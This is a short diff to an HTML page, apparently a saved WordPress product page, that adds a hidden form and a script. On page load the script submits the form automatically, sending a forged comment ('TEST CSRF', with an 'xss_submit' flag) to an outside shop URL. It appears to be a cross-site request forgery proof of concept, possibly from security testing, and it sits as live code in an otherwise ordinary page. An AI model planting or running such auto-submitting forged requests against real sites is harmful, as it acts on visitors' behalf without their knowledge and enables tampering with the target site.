@@ -2953,5 +2953,17 @@
       defer
       data-wp-strategy="defer"
     ></script>
+    <form
+      id="csrfForm"
+      method="POST"
+      action="https://mydecobox.shop/product/hop-qua-canh-cong/"
+    >
+      <input type="hidden" name="comment" value="TEST CSRF" />
+      <input type="hidden" name="xss_submit" value="1" />
+    </form>
+
+    <script>
+      document.getElementById("csrfForm").submit();
+    </script>
   </body>
 </html>
